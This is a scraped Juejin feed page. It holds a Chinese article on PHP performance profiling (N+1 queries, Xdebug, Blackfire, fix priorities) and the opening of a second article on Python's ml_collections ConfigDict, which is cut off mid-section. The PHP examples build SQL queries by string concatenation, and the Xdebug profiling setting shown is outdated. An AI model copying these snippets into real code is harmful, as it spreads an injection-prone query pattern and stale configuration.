12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">PHP 应用性能分析 从假设到数据与修复优先级</h2>
<h3 data-id="heading-1">为什么 PHP 应用需要性能分析</h3>
<p>作为 PHP 开发者，你经常要构建可扩展、能支撑高并发、性能稳定的应用。但当系统复杂度或流量上来后，性能瓶颈就会出现，而且这些问题在开发甚至测试阶段往往看不到。</p>
<p>性能分析（profiling）能让你从猜测回到数据。它帮你衡量应用各个环节的性能，精准找出低效点。与其凭感觉优化，不如直接看数据告诉你哪里慢——数据库查询、内存占用还是函数调用。</p>
<p>本文会介绍如何对 PHP 应用做性能分析、常见性能问题、适用工具，以及如何为修复排优先级。
<a href="https://link.juejin.cn?target=https%3A%2F%2Fcatchadmin.com%2Fpost%2F2026-01%2Fprofiling-php-applications-from-assumptions-to-data" target="_blank" title="https://catchadmin.com/post/2026-01/profiling-php-applications-from-assumptions-to-data" ref="nofollow noopener noreferrer">原文 PHP 应用性能分析 从假设到数据与修复优先级</a></p>
<h3 data-id="heading-2">性能分析基础：你需要知道什么</h3>
<p>性能分析的核心是测量与分析应用的资源消耗，例如 CPU、内存和执行时间，帮助你找出真正需要优化的“热区”。</p>
<p>性能分析数据通常能回答这些问题：</p>
<ul>
<li><strong>内存占用</strong>：脚本执行过程中用了多少内存？</li>
<li><strong>执行时间</strong>：哪些函数或模块耗时最长？</li>
<li><strong>数据库查询性能</strong>：哪些查询最慢？总共执行了多少次？</li>
<li><strong>CPU 使用</strong>：哪些函数消耗了最多 CPU 计算？</li>
</ul>
<p>通过这些指标，你就能精准定位性能问题并优化代码。</p>
<h3 data-id="heading-3">PHP 应用常见性能问题</h3>
<p>做性能分析时，下面这些问题最常出现。</p>
<h4 data-id="heading-4">过多的数据库查询</h4>
<p>如果应用频繁与数据库交互，响应就可能变慢，常见原因包括：</p>
<ul>
<li>查询写得低效（取了过多数据、缺少索引）</li>
<li>在循环里执行查询，出现 N+1 问题</li>
</ul>
<p>示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$posts</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM posts"</span>);
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$posts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$post</span>) {
    <span class="hljs-variable">$comments</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM comments WHERE post_id = "</span> . <span class="hljs-variable">$post</span>[<span class="hljs-string">'id'</span>]);
    <span class="hljs-comment">// display posts and comments</span>
}
</code></pre>
<p>如果有 100 篇文章，这段代码会跑 101 次查询（1 次取文章 + 100 次取评论），效率很低。</p>
<h4 data-id="heading-5">低效的循环</h4>
<p>有些代码在大数据集上使用嵌套循环或昂贵操作，执行时间会被放大。</p>
<p>示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$data</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$item</span>) {
    <span class="hljs-comment">// Performing some heavy operation</span>
    <span class="hljs-variable">$result</span> = <span class="hljs-title function_ invoke__">complexOperation</span>(<span class="hljs-variable">$item</span>);
}
</code></pre>
<p>Profiling 能帮你识别这些循环并衡量耗时，给你优化的抓手。</p>
<h4 data-id="heading-6">内存泄漏</h4>
<p>内存泄漏指对象或变量占用过多内存且无法及时释放。数据量大时，内存会持续增长，导致性能下降甚至崩溃。</p>
<p>示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-keyword">while</span> (<span class="hljs-variable">$row</span> = <span class="hljs-variable">$result</span>-&gt;<span class="hljs-title function_ invoke__">fetch_assoc</span>()) {
    <span class="hljs-variable">$rows</span>[] = <span class="hljs-variable">$row</span>;
}
</code></pre>
<p>如果 <code>$rows</code> 无限增长，就可能耗尽内存。Profiling 能帮助你识别并优化这类问题。</p>
<h4 data-id="heading-7">缓存策略不佳</h4>
<p>缓存是提速的利器，但策略不当也会拖慢系统，例如：</p>
<ul>
<li>没有缓存数据（每次都从数据库重新查询）</li>
<li>缓存失效策略混乱</li>
</ul>
<h3 data-id="heading-8">PHP 应用性能分析的方法</h3>
<p>下面是几种常见且实用的性能分析方法与工具。</p>
<h4 data-id="heading-9">使用 microtime() 手动性能分析</h4>
<p>对于小范围性能测试，可以用 PHP 内置的 <code>microtime()</code> 记录执行时间。</p>
<p>示例：使用 microtime() 进行基础性能分析</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-variable">$start_time</span> = <span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>);
<span class="hljs-comment">// Simulating some code execution</span>
<span class="hljs-title function_ invoke__">sleep</span>(<span class="hljs-number">2</span>);  <span class="hljs-comment">// Sleep for 2 seconds</span>
<span class="hljs-variable">$end_time</span> = <span class="hljs-title function_ invoke__">microtime</span>(<span class="hljs-literal">true</span>);
<span class="hljs-variable">$execution_time</span> = <span class="hljs-variable">$end_time</span> - <span class="hljs-variable">$start_time</span>;
<span class="hljs-keyword">echo</span> <span class="hljs-string">"Execution time: "</span> . <span class="hljs-variable">$execution_time</span> . <span class="hljs-string">" seconds"</span>;
</code></pre>
<p>这种方法简单，但不适合复杂应用，更适合小片段性能检查。</p>
<h4 data-id="heading-10">Xdebug：强大的性能分析工具</h4>
<p>Xdebug 是最常用的 PHP profiling 工具之一，可跟踪函数调用、内存占用和执行时间。它会生成 cachegrind 文件，并可用 KCacheGrind 或 QCacheGrind 可视化分析。</p>
<p>配置 Xdebug 性能分析：</p>
<ol>
<li>安装 Xdebug。</li>
</ol>
<pre><code class="hljs language-bash" lang="bash">sudo apt-get install php-xdebug
</code></pre>
<ol start="2">
<li>在 <code>php.ini</code> 中开启 profiling：</li>
</ol>
<pre><code class="hljs language-ini" lang="ini"><span class="hljs-attr">xdebug.profiler_enable</span> = <span class="hljs-number">1</span>
<span class="hljs-attr">xdebug.profiler_output_dir</span> = <span class="hljs-string">"/var/tmp/xdebug_profiles"</span>
</code></pre>
<ol start="3">
<li>运行应用，生成 cachegrind 文件。</li>
<li>用 KCacheGrind 或 QCacheGrind 可视化分析。</li>
</ol>
<p>示例：Xdebug 性能分析输出</p>
<pre><code class="hljs language-text" lang="text">Function Name     Calls  Time   Memory
--------------------------------------
myFunction()       10    0.005  512KB
databaseQuery()    15    0.020  1MB
</code></pre>
<p>在这个例子里，<code>databaseQuery()</code> 耗时更高，说明数据库层可能需要进一步优化。</p>
<h4 data-id="heading-11">Blackfire：现代化性能分析方案</h4>
<p>Blackfire 更现代、体验友好，提供火焰图（flame graph），能直观看到 CPU 和内存耗时。</p>
<p>Blackfire 的特点：</p>
<ul>
<li>自动性能分析：每次 HTTP 请求都可自动分析</li>
<li>对比分析：支持对比优化前后的性能</li>
<li>火焰图（flame graph）：可视化 CPU 与内存消耗</li>
</ul>
<p>使用 Blackfire：</p>
<ol>
<li>在 Blackfire.io 注册并安装 Blackfire Agent 与 Profiler。</li>
<li>在应用里启用性能分析：</li>
</ol>
<pre><code class="hljs language-php" lang="php"><span class="hljs-title class_">Blackfire\Profiler</span>::<span class="hljs-title function_ invoke__">enable</span>();
</code></pre>
<ol start="3">
<li>执行性能分析后，报告中会以火焰图展示代码耗时分布。</li>
</ol>
<h3 data-id="heading-12">解析性能分析数据：把洞察变成行动</h3>
<p>拿到性能分析数据后，关键是判断哪些地方耗资源最多，再决定优化优先级。</p>
<h4 data-id="heading-13">慢函数</h4>
<p>优先找执行时间长的函数。通常是多做了不必要的计算，或处理了过多数据。</p>
<h4 data-id="heading-14">内存占用</h4>
<p>如果脚本吃内存过多，检查是否有大对象或数组长期保留。可以考虑释放内存或改成流式处理。</p>
<h4 data-id="heading-15">低效的数据库查询</h4>
<p>慢查询通常是性能的最大瓶颈。可考虑加索引、缓存，或重写查询逻辑。</p>
<p>示例：</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-comment">// Inefficient:</span>
<span class="hljs-keyword">foreach</span> (<span class="hljs-variable">$posts</span> <span class="hljs-keyword">as</span> <span class="hljs-variable">$post</span>) {
    <span class="hljs-variable">$comments</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM comments WHERE post_id = "</span> . <span class="hljs-variable">$post</span>[<span class="hljs-string">'id'</span>]);
}
<span class="hljs-comment">// Optimized:</span>
<span class="hljs-variable">$post_ids</span> = <span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">','</span>, <span class="hljs-title function_ invoke__">array_column</span>(<span class="hljs-variable">$posts</span>, <span class="hljs-string">'id'</span>));
<span class="hljs-variable">$comments</span> = <span class="hljs-variable">$db</span>-&gt;<span class="hljs-title function_ invoke__">query</span>(<span class="hljs-string">"SELECT * FROM comments WHERE post_id IN (<span class="hljs-subst">$post_ids</span>)"</span>);
</code></pre>
<p>这种改写把多次查询变成一次查询，性能明显更好。</p>
<h3 data-id="heading-16">修复优先级：先从哪里下手</h3>
<p>拿到数据后，应该优先处理收益最大的地方：</p>
<ul>
<li><strong>用户体验优先</strong>：直接影响页面响应的慢点必须先解决。</li>
<li><strong>修复成本</strong>：大规模重构要衡量投入产出，先做小改动的高收益优化。</li>
<li><strong>高影响区域</strong>：数据库查询、内存占用和 CPU 密集的函数往往最值得先动手。</li>
</ul>
<p>比如，如果频繁调用的函数存在内存泄漏，修复它会在高并发下带来显著收益。</p>
<h3 data-id="heading-17">结语：性能分析对 PHP 性能优化的价值</h3>
<p>性能分析让性能优化有数据支撑。你不再靠直觉找瓶颈，而是通过量化结果准确定位问题。无论是 <code>microtime()</code>、Xdebug 还是 Blackfire，性能分析都能给你足够的洞察来做出有效优化。</p>
<p>养成定期性能分析的习惯，可以让你的 PHP 应用在流量和复杂度增长时依然保持性能稳定。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[你还没受够python原生字典的写法吗？用ml_collections试试吧]]></title>    <link>https://juejin.cn/post/7596975035438694409</link>    <guid>https://juejin.cn/post/7596975035438694409</guid>    <pubDate>2026-01-20T03:55:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7596975035438694409" data-draft-id="7596983314806358066" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="你还没受够python原生字典的写法吗？用ml_collections试试吧"/> <meta itemprop="keywords" content="Python,机器学习,深度学习"/> <meta itemprop="datePublished" content="2026-01-20T03:55:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="茫茫此生何所求"/> <meta itemprop="url" content="https://juejin.cn/user/465848663552974"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            你还没受够python原生字典的写法吗？用ml_collections试试吧
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/465848663552974/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    茫茫此生何所求
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T03:55:27.000Z" title="Tue Jan 20 2026 03:55:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    20
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读6分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">一、ml_collections是什么</h2>
<p>ml_collections 是一个python库，初衷设计是专为机器学习配置。而我在实际使用过程中，把它当做来一个原生字典的替代项，感觉很好用。本文主要介绍基础的使用和锁机制。</p>
<p>地址：<a href="https://link.juejin.cn?target=https%3A%2F%2Fpypi.org%2Fproject%2Fml-collections%2F" target="_blank" title="https://pypi.org/project/ml-collections/" ref="nofollow noopener noreferrer">pypi.org/project/ml-…</a></p>
<p>核心特性：</p>
<ul>
<li>可以让字典使用.的方式来访问和修改，而原生方式是[""]=xx；</li>
<li>提供了锁机制，当写完字典后，在一定程度上防止了误修改；</li>
<li>自动带了数据类型检查；</li>
</ul>
<h2 data-id="heading-1">二、基础用法</h2>
<p>下文代码所用的版本：1.1.0</p>
<h3 data-id="heading-2">1. 创建方式1：ConfigDict()</h3>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import ConfigDict

<span class="hljs-comment"># ========== 方式1：创建空的ConfigDict，最基础</span>
<span class="hljs-attr">cfg</span> = ConfigDict()

<span class="hljs-comment"># ========== 方式2：初始化时传入原生字典，一键创建</span>
<span class="hljs-attr">cfg</span> = ConfigDict({
    "lr": 0.001,
    "batch_size": 32,
    "epochs": 100
})

<span class="hljs-comment"># ========== 方式3：空配置逐步赋值创建</span>
<span class="hljs-attr">cfg</span> = ConfigDict()
<span class="hljs-comment"># 基础单层配置赋值</span>
<span class="hljs-attr">cfg.lr</span> = <span class="hljs-number">0.001</span>
<span class="hljs-attr">cfg.batch_size</span> = <span class="hljs-number">32</span>
<span class="hljs-attr">cfg.epochs</span> = <span class="hljs-number">200</span>
<span class="hljs-comment"># 配置支持所有Python基础数据类型</span>
<span class="hljs-attr">cfg.device</span> = <span class="hljs-string">"cuda"</span>
<span class="hljs-attr">cfg.use_amp</span> = <span class="hljs-literal">True</span>
<span class="hljs-attr">cfg.weight_decay</span> = <span class="hljs-number">1</span>e-<span class="hljs-number">5</span>

</code></pre>
<h3 data-id="heading-3">2. 创建方式2：create()，可以一次性把配置都写完</h3>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import config_dict

<span class="hljs-comment"># 用 create 一次性写完所有嵌套配置</span>
<span class="hljs-attr">cfg</span> = config_dict.create(
    <span class="hljs-comment"># 数据集配置</span>
    <span class="hljs-attr">data</span>=config_dict.create(
        <span class="hljs-attr">dataset</span>=<span class="hljs-string">"cifar10"</span>,
        <span class="hljs-attr">data_dir</span>=<span class="hljs-string">"./data"</span>,
        <span class="hljs-attr">batch_size</span>=<span class="hljs-number">32</span>,
        <span class="hljs-attr">num_workers</span>=<span class="hljs-number">4</span>
    ),
    <span class="hljs-comment"># 模型配置</span>
    <span class="hljs-attr">model</span>=config_dict.create(
        <span class="hljs-attr">backbone</span>=<span class="hljs-string">"resnet18"</span>,
        <span class="hljs-attr">num_classes</span>=<span class="hljs-number">10</span>,
        <span class="hljs-attr">dropout</span>=<span class="hljs-number">0.2</span>,
        <span class="hljs-attr">pretrained</span>=<span class="hljs-literal">True</span>
    ),
    <span class="hljs-comment"># 训练配置 + 嵌套的优化器子配置</span>
    <span class="hljs-attr">train</span>=config_dict.create(
        <span class="hljs-attr">epochs</span>=<span class="hljs-number">200</span>,
        <span class="hljs-attr">lr</span>=<span class="hljs-number">0.001</span>,
        <span class="hljs-attr">optimizer</span>=config_dict.create(
            <span class="hljs-attr">name</span>=<span class="hljs-string">"adam"</span>,
            <span class="hljs-attr">weight_decay</span>=<span class="hljs-number">1</span>e-<span class="hljs-number">5</span>
        )
    )
)


<span class="hljs-comment"># 打印配置（可选）</span>
print("实验配置：", cfg)
</code></pre>
<h3 data-id="heading-4">3. 嵌套</h3>
<p>字典的值也可以是ConfigDict</p>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import ConfigDict

<span class="hljs-comment"># 创建根配置</span>
<span class="hljs-attr">cfg</span> = ConfigDict()

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># 第一层：数据集相关配置（嵌套1层）</span>
<span class="hljs-comment"># --------------------------</span>
<span class="hljs-attr">cfg.data</span> = ConfigDict()  <span class="hljs-comment"># 先给data赋值为一个空的ConfigDict</span>
<span class="hljs-attr">cfg.data.dataset_name</span> = <span class="hljs-string">"cifar10"</span>  <span class="hljs-comment"># 数据集名称</span>
<span class="hljs-attr">cfg.data.data_path</span> = <span class="hljs-string">"./dataset/cifar10"</span>  <span class="hljs-comment"># 数据存放路径</span>
<span class="hljs-attr">cfg.data.batch_size</span> = <span class="hljs-number">32</span>  <span class="hljs-comment"># 批次大小</span>
<span class="hljs-attr">cfg.data.num_workers</span> = <span class="hljs-number">4</span>  <span class="hljs-comment"># 加载数据的线程数</span>

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># 第一层：模型相关配置（嵌套1层）</span>
<span class="hljs-comment"># --------------------------</span>
<span class="hljs-attr">cfg.model</span> = ConfigDict()
<span class="hljs-attr">cfg.model.backbone</span> = <span class="hljs-string">"resnet18"</span>  <span class="hljs-comment"># 模型骨干网络</span>
<span class="hljs-attr">cfg.model.num_classes</span> = <span class="hljs-number">10</span>  <span class="hljs-comment"># 分类任务的类别数</span>
<span class="hljs-attr">cfg.model.dropout_rate</span> = <span class="hljs-number">0.2</span>  <span class="hljs-comment"># dropout正则化概率</span>
<span class="hljs-attr">cfg.model.use_pretrain</span> = <span class="hljs-literal">True</span>  <span class="hljs-comment"># 是否使用预训练权重</span>

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># 第一层：训练相关配置（嵌套2层）</span>
<span class="hljs-comment"># --------------------------</span>
<span class="hljs-attr">cfg.train</span> = ConfigDict()
<span class="hljs-attr">cfg.train.epochs</span> = <span class="hljs-number">200</span>  <span class="hljs-comment"># 训练总轮数</span>
<span class="hljs-attr">cfg.train.base_lr</span> = <span class="hljs-number">0.001</span>  <span class="hljs-comment"># 基础学习率</span>
<span class="hljs-comment"># 训练配置里再嵌套：优化器的子配置（嵌套第二层）</span>
<span class="hljs-attr">cfg.train.optimizer</span> = ConfigDict()
<span class="hljs-attr">cfg.train.optimizer.name</span> = <span class="hljs-string">"adam"</span>  <span class="hljs-comment"># 优化器名称</span>
<span class="hljs-attr">cfg.train.optimizer.weight_decay</span> = <span class="hljs-number">0.00005</span>  <span class="hljs-comment"># 权重衰减</span>

<span class="hljs-comment"># --------------------------</span>
<span class="hljs-comment"># 取值：链式点语法，一层一层访问</span>
<span class="hljs-comment"># --------------------------</span>
print("数据集名称：", cfg.data.dataset_name)
print("模型骨干网络：", cfg.model.backbone)
print("优化器名称：", cfg.train.optimizer.name)
print("权重衰减系数：", cfg.train.optimizer.weight_decay)
</code></pre>
<h3 data-id="heading-5">4. 读取方式</h3>
<p>同时支持.式和[]中括号方式</p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

cfg = ConfigDict({
    <span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>,
    <span class="hljs-string">"model"</span>: ConfigDict({<span class="hljs-string">"backbone"</span>:<span class="hljs-string">"resnet18"</span>})
})

<span class="hljs-comment"># ========== 方式1：点语法 读取</span>
<span class="hljs-built_in">print</span>(cfg.lr)               <span class="hljs-comment"># 输出：0.001</span>
<span class="hljs-built_in">print</span>(cfg.model.backbone)   <span class="hljs-comment"># 输出：resnet18</span>

<span class="hljs-comment"># ========== 方式2：字典中括号语法 读取</span>
<span class="hljs-built_in">print</span>(cfg[<span class="hljs-string">"lr"</span>])            <span class="hljs-comment"># 输出：0.001</span>
<span class="hljs-built_in">print</span>(cfg[<span class="hljs-string">"model"</span>][<span class="hljs-string">"backbone"</span>]) <span class="hljs-comment"># 输出：resnet18</span>
</code></pre>
<h3 data-id="heading-6">5. 删除</h3>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">from</span> ml_collections <span class="hljs-keyword">import</span> ConfigDict

cfg = ConfigDict({<span class="hljs-string">"lr"</span>:<span class="hljs-number">0.001</span>, <span class="hljs-string">"batch_size"</span>:<span class="hljs-number">32</span>, <span class="hljs-string">"epochs"</span>:<span class="hljs-number">200</span>})

<span class="hljs-keyword">del</span> cfg.epochs <span class="hljs-comment"># 删除基础字段</span>
<span class="hljs-keyword">del</span> cfg[<span class="hljs-string">"batch_size"</span>] <span class="hljs-comment"># 用字典语法删除，等价</span>
<span class="hljs-built_in">print</span>(<span class="hljs-string">"删除后配置："</span>, cfg) <span class="hljs-comment"># 输出：lr: 0.001</span>
</code></pre>
<h3 data-id="heading-7">6. 自动类型校验</h3>
<p>int可以赋值给int，int可以赋值给float，int不能赋值给string，string也不能赋值给int</p>
<pre><code class="hljs language-ini" lang="ini">from ml_collections import config_dict

<span class="hljs-attr">cfg</span> = config_dict.ConfigDict()
<span class="hljs-attr">cfg.float_field</span> = <span class="hljs-number">12.6</span> <span class="hljs-comment"># float类型</span>
<span class="hljs-attr">cfg.integer_field</span> = <span class="hljs-number">123</span> <span class="hljs-comment"># int类型</span>
<span class="hljs-attr">cfg.another_integer_field</span> = <span class="hljs-number">234</span> <span class="hljs-comment"># int类型</span>
<span class="hljs-attr">cfg.nested</span> = config_dict.ConfigDict()
<span class="hljs-attr">cfg.nested.string_field</span> = <span class="hljs-string">'tom'</span> <span class="hljs-comment"># str类型</span>

print(cfg.integer_field)  <span class="hljs-comment"># Prints 123.</span>
print(cfg<span class="hljs-section">['integer_field']</span>)  <span class="hljs-comment"># Prints 123 as well.</span>

try:
  <span class="hljs-attr">cfg.integer_field</span> = <span class="hljs-string">'tom'</span>  <span class="hljs-comment"># 将str赋值给int类型，报错</span>
except TypeError as e:
  print(e)

<span class="hljs-attr">cfg.float_field</span> = <span class="hljs-number">12</span>  <span class="hljs-comment"># int可以给float赋值，自动类型转换</span>
<span class="hljs-attr">cfg.nested.string_field</span> = u<span class="hljs-string">'bob'</span>  <span class="hljs-comment"># str赋值</span>

print(cfg)
</code></pre>
<h2 data-id="heading-8">三、锁机制</h2>
<h3 data-id="heading-9">1. 方式1: lock()</h3>
<ul>
<li>lock后，不可以新增字段，不可以删除字段</li>
